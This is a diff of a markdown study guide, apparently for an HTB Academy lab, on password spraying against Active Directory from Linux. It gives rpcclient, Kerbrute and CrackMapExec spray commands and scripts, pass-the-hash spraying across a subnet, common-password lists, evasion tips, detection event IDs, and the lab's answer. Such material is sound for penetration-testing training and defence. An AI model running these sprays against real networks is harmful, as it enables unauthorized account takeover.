@@ -1,4 +1,4 @@
-# Internal Password Spraying - from Linux
+# 🐧 Password Spraying from Linux
 
 ## 📋 Overview
 
@@ -7,28 +7,32 @@ Password spraying is one of the most effective methods for gaining initial domai
 ## 🎯 Attack Methodology
 
 ### ⚠️ **Critical Prerequisites**
-- **Password Policy Knowledge**: Essential for safe execution
-- **Valid User List**: Accurate username enumeration completed
-- **Lockout Threshold**: Must stay below the limit (typically 3-5 attempts)
-- **Attack Timing**: Space attempts based on lockout duration
+
+* **Password Policy Knowledge**: Essential for safe execution
+* **Valid User List**: Accurate username enumeration completed
+* **Lockout Threshold**: Must stay below the limit (typically 3-5 attempts)
+* **Attack Timing**: Space attempts based on lockout duration
 
 ### 🔍 **Attack Flow**
+
 1. **User List Preparation**: Clean, validated username list
 2. **Password Selection**: Common, policy-compliant passwords
 3. **Attack Execution**: Systematic credential testing
 4. **Success Validation**: Verify discovered credentials
 5. **Documentation**: Log all activities and results
 
----
+***
 
 ## 🔧 rpcclient Password Spraying
 
 ### 📝 **Basic Methodology**
-- **Success Indicator**: `Authority Name` in response
-- **Bash One-Liner**: Efficient automation approach
-- **Filtering**: Grep for successful authentications only
+
+* **Success Indicator**: `Authority Name` in response
+* **Bash One-Liner**: Efficient automation approach
+* **Filtering**: Grep for successful authentications only
 
 ### 🚀 **Single Password Spray**
+
 ```bash
 # Basic rpcclient password spray
 for u in $(cat valid_users.txt); do 
@@ -37,12 +41,14 @@ done
 ```
 
 ### 📊 **Example Successful Output**
+
 ```
 Account Name: tjohnson, Authority Name: INLANEFREIGHT
 Account Name: sgage, Authority Name: INLANEFREIGHT
 ```
 
 ### 🔧 **Enhanced Script with Logging**
+
 ```bash
 #!/bin/bash
 # Enhanced password spraying with logging
@@ -68,17 +74,19 @@ done
 echo "[$(date)] Password spray completed" | tee -a $LOGFILE
 ```
 
----
+***
 
 ## 🎫 Kerbrute Password Spraying
 
 ### ⚡ **Key Advantages**
-- **Speed**: Fastest password spraying method
-- **Stealth**: Minimal event generation
-- **Kerberos-Based**: Uses native authentication protocol
-- **Clear Output**: Easy to identify successful logins
+
+* **Speed**: Fastest password spraying method
+* **Stealth**: Minimal event generation
+* **Kerberos-Based**: Uses native authentication protocol
+* **Clear Output**: Easy to identify successful logins
 
 ### 🚀 **Basic Kerbrute Spraying**
+
 ```bash
 # Single password spray
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
@@ -91,6 +99,7 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt We
 ```
 
 ### 📊 **Example Kerbrute Output**
+
 ```
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -108,6 +117,7 @@ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
 ```
 
 ### 🔄 **Multiple Password Spraying**
+
 ```bash
 #!/bin/bash
 # Multiple password spray with delays
@@ -136,17 +146,19 @@ for password in "${PASSWORDS[@]}"; do
 done
 ```
 
----
+***
 
 ## 🔨 CrackMapExec Password Spraying
 
 ### 💪 **Key Features**
-- **SMB-Based**: Uses SMB protocol for authentication
-- **Bulk Testing**: Efficient user list processing
-- **Success Filtering**: Easy identification of valid credentials
-- **Immediate Validation**: Built-in credential verification
+
+* **SMB-Based**: Uses SMB protocol for authentication
+* **Bulk Testing**: Efficient user list processing
+* **Success Filtering**: Easy identification of valid credentials
+* **Immediate Validation**: Built-in credential verification
 
 ### 🚀 **Basic CrackMapExec Spraying**
+
 ```bash
 # Single password against user list
 crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
@@ -156,11 +168,13 @@ crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
 
 ### 📊 **Example Successful Output**
+
 ```
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
 ```
 
 ### ✅ **Credential Validation**
+
 ```bash
 # Validate discovered credentials
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123
@@ -171,6 +185,7 @@ crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 ```
 
 ### 🔧 **Advanced CrackMapExec Script**
+
 ```bash
 #!/bin/bash
 # Advanced CrackMapExec spraying with comprehensive logging
@@ -212,29 +227,34 @@ for password in "${PASSWORDS[@]}"; do
 done
 ```
 
----
+***
 
 ## 🏠 Local Administrator Password Reuse
 
 ### 🎯 **Attack Concept**
+
 Local administrator accounts often have the same password across multiple systems due to:
-- **Gold Images**: Automated deployments using templates
-- **Management Ease**: Admins using same password everywhere
-- **Legacy Practices**: Old password policies still in effect
+
+* **Gold Images**: Automated deployments using templates
+* **Management Ease**: Admins using same password everywhere
+* **Legacy Practices**: Old password policies still in effect
 
 ### 🔍 **Target Prioritization**
-- **High-Value Servers**: SQL, Exchange, file servers
-- **Domain Controllers**: If accessible (high impact)
-- **Management Systems**: SCCM, monitoring tools
-- **Jump Boxes**: Administrative workstations
+
+* **High-Value Servers**: SQL, Exchange, file servers
+* **Domain Controllers**: If accessible (high impact)
+* **Management Systems**: SCCM, monitoring tools
+* **Jump Boxes**: Administrative workstations
 
 ### 💥 **Hash-Based Spraying**
+
 ```bash
 # Local admin hash spraying across subnet
 crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
 **Example Output:**
+
 ```
 SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
 SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
@@ -242,6 +262,7 @@ SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administ
 ```
 
 ### 🔧 **Comprehensive Local Admin Hunting**
+
 ```bash
 #!/bin/bash
 # Hunt for local admin password reuse
@@ -262,20 +283,23 @@ done
 ```
 
 ### ⚠️ **Important Flags**
-- `--local-auth`: Prevents domain account lockouts
-- `--threads`: Controls connection speed
-- `-H`: Uses NTLM hash instead of password
 
----
+* `--local-auth`: Prevents domain account lockouts
+* `--threads`: Controls connection speed
+* `-H`: Uses NTLM hash instead of password
+
+***
 
 ## 🎯 HTB Academy Lab Walkthrough
 
 ### 📝 Lab Question
-*"Find the user account starting with the letter 's' that has the password Welcome1. Submit the username as your answer."*
+
+_"Find the user account starting with the letter 's' that has the password Welcome1. Submit the username as your answer."_
 
 ### 🚀 Step-by-Step Solution
 
 #### 1️⃣ **Connect to Attack Host**
+
 ```bash
 # SSH to target
 ssh htb-student@10.129.54.201
@@ -283,6 +307,7 @@ ssh htb-student@10.129.54.201
 ```
 
 #### 2️⃣ **Gather User List with enum4linux**
+
 ```bash
 # Use enum4linux to gather usernames (exact HTB lab method)
 enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt
@@ -296,6 +321,7 @@ wc -l validUsers.txt
 ```
 
 #### 3️⃣ **Method 1: rpcclient Password Spray**
+
 ```bash
 # Test Welcome1 password against all users
 for u in $(cat validUsers.txt); do 
@@ -304,21 +330,25 @@ done
 ```
 
 #### 4️⃣ **Method 2: Kerbrute Password Spray (Recommended)**
+
 ```bash
 # Most reliable method - exactly as shown in HTB lab
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
 ```
 
 #### 5️⃣ **Method 3: CrackMapExec**
+
 ```bash
 # Alternative verification
 crackmapexec smb 172.16.5.5 -u validUsers.txt -p Welcome1 | grep +
 ```
 
 #### 6️⃣ **Expected Results**
+
 Based on the lab content, you should see:
 
 **enum4linux output (userlist creation):**
+
 ```bash
 # validUsers.txt should contain usernames like:
 administrator
@@ -332,6 +362,7 @@ avazquez
 ```
 
 **Password spraying results:**
+
 ```bash
 # rpcclient output:
 Account Name: sgage, Authority Name: INLANEFREIGHT
@@ -348,6 +379,7 @@ Done! Tested 21 logins (1 successes) in 0.061 seconds
 ### ✅ **Answer**: `sgage`
 
 #### 7️⃣ **Verification**
+
 ```bash
 # Verify the discovered credentials
 crackmapexec smb 172.16.5.5 -u sgage -p Welcome1
@@ -355,45 +387,48 @@ crackmapexec smb 172.16.5.5 -u sgage -p Welcome1
 # Should show successful authentication
 ```
 
----
+***
 
 ## 📊 Tool Comparison
 
-| **Tool** | **Speed** | **Stealth** | **Accuracy** | **Features** | **Best Use Case** |
-|----------|-----------|-------------|--------------|--------------|-------------------|
-| **rpcclient** | Medium | Medium | High | Simple, reliable | Script automation |
-| **Kerbrute** | Fast | High | High | Kerberos-based, minimal logs | Large-scale spraying |
-| **CrackMapExec** | Medium | Low | High | Validation, local auth | Comprehensive testing |
+| **Tool**         | **Speed** | **Stealth** | **Accuracy** | **Features**                 | **Best Use Case**     |
+| ---------------- | --------- | ----------- | ------------ | ---------------------------- | --------------------- |
+| **rpcclient**    | Medium    | Medium      | High         | Simple, reliable             | Script automation     |
+| **Kerbrute**     | Fast      | High        | High         | Kerberos-based, minimal logs | Large-scale spraying  |
+| **CrackMapExec** | Medium    | Low         | High         | Validation, local auth       | Comprehensive testing |
 
----
+***
 
 ## 🛡️ Security Considerations
 
 ### 🚨 **Event Generation**
 
-| **Tool** | **Event IDs Generated** | **Detection Risk** |
-|----------|------------------------|-------------------|
-| **rpcclient** | 4625 (failures), 4624 (success) | Medium |
-| **Kerbrute** | 4768 (TGT requests), 4771 (Pre-auth failed) | Low |
-| **CrackMapExec** | 4625 (failures), 4624 (success), 4648 (explicit logon) | High |
+| **Tool**         | **Event IDs Generated**                                | **Detection Risk** |
+| ---------------- | ------------------------------------------------------ | ------------------ |
+| **rpcclient**    | 4625 (failures), 4624 (success)                        | Medium             |
+| **Kerbrute**     | 4768 (TGT requests), 4771 (Pre-auth failed)            | Low                |
+| **CrackMapExec** | 4625 (failures), 4624 (success), 4648 (explicit logon) | High               |
 
 ### 🔍 **Defense Evasion**
-- **Timing**: Space attempts based on lockout policy
-- **User Selection**: Avoid high-privilege accounts initially
-- **Password Selection**: Use policy-compliant passwords
-- **Monitoring**: Watch for defensive responses
+
+* **Timing**: Space attempts based on lockout policy
+* **User Selection**: Avoid high-privilege accounts initially
+* **Password Selection**: Use policy-compliant passwords
+* **Monitoring**: Watch for defensive responses
 
 ### 📈 **Detection Indicators**
-- **Multiple authentication failures** from single source
-- **Sequential login attempts** across user list
-- **Unusual authentication timing** (outside business hours)
-- **High volume of Event ID 4625** in short timeframe
 
----
+* **Multiple authentication failures** from single source
+* **Sequential login attempts** across user list
+* **Unusual authentication timing** (outside business hours)
+* **High volume of Event ID 4625** in short timeframe
+
+***
 
 ## 🔐 Password Selection Strategy
 
 ### 🎯 **Common Effective Passwords**
+
 ```bash
 # Season + Year + Complexity
 Spring2024!
@@ -414,6 +449,7 @@ Admin123
 ```
 
 ### 📋 **Password Policy Compliance**
+
 ```bash
 # For 8-character minimum, complexity enabled:
 - Minimum 8 characters
@@ -429,11 +465,12 @@ Password1    # P(upper) + assword(lower) + 1(number) = 3/4 types ✓
 Company!     # C(upper) + ompany(lower) + !(special) = 3/4 types ✓
 ```
 
----
+***
 
 ## 📝 Attack Documentation Template
 
 ### 📊 **Spray Session Log**
+
 ```
 Date: 2024-01-15
 Time: 14:30:00 UTC
@@ -448,6 +485,7 @@ Event Risk: Low (Kerberos-based)
 ```
 
 ### 🎯 **Success Tracking**
+
 ```bash
 # Create success log
 echo "Username:Password:Method:Timestamp" > successful_logins.log
@@ -462,11 +500,12 @@ while IFS=: read -r user pass method timestamp; do
 done < successful_logins.log
 ```
 
----
+***
 
 ## ⚡ Quick Reference Commands
 
 ### 🔧 **One-Liner Sprays**
+
 ```bash
 # enum4linux user enumeration (HTB method)
 enum4linux -U DC_IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt
@@ -485,6 +524,7 @@ crackmapexec smb --local-auth SUBNET -u administrator -H HASH | grep +
 ```
 
 ### 🔍 **Result Extraction**
+
 ```bash
 # Extract usernames from successful sprays
 grep "VALID LOGIN" kerbrute_output.txt | awk '{print $4}' | cut -d'@' -f1
@@ -496,28 +536,31 @@ grep '\[+\]' cme_output.txt | grep -oP '\\\\[^\\]+\\\\K[^:]+'
 grep "Authority Name" rpc_output.txt | awk '{print $3}' | cut -d',' -f1
 ```
 
----
+***
 
 ## 🔑 Key Takeaways
 
 ### ✅ **Attack Best Practices**
-- **Know the Policy**: Essential for safe execution
-- **Multiple Tools**: Use different methods for verification
-- **Proper Timing**: Space attempts to avoid lockouts
-- **Documentation**: Log everything for client reporting
+
+* **Know the Policy**: Essential for safe execution
+* **Multiple Tools**: Use different methods for verification
+* **Proper Timing**: Space attempts to avoid lockouts
+* **Documentation**: Log everything for client reporting
 
 ### ⚠️ **Critical Warnings**
-- **Never Exceed Lockout Threshold**: Typically 3-5 attempts max
-- **Monitor Bad Password Counts**: Check account status before spraying
-- **Avoid High-Value Accounts**: Don't target admin accounts initially
-- **Space Attempts**: Wait lockout duration + buffer between sprays
+
+* **Never Exceed Lockout Threshold**: Typically 3-5 attempts max
+* **Monitor Bad Password Counts**: Check account status before spraying
+* **Avoid High-Value Accounts**: Don't target admin accounts initially
+* **Space Attempts**: Wait lockout duration + buffer between sprays
 
 ### 🎯 **Post-Success Actions**
+
 1. **Immediate Validation**: Verify all discovered credentials
 2. **Privilege Assessment**: Check user permissions and group memberships
 3. **Access Expansion**: Use credentials for further enumeration
 4. **Documentation**: Record all findings for reporting
 
----
+***
 
-*Password spraying success requires patience, methodology, and respect for account lockout policies - one successful credential can open the entire domain.* 
+_Password spraying success requires patience, methodology, and respect for account lockout policies - one successful credential can open the entire domain._
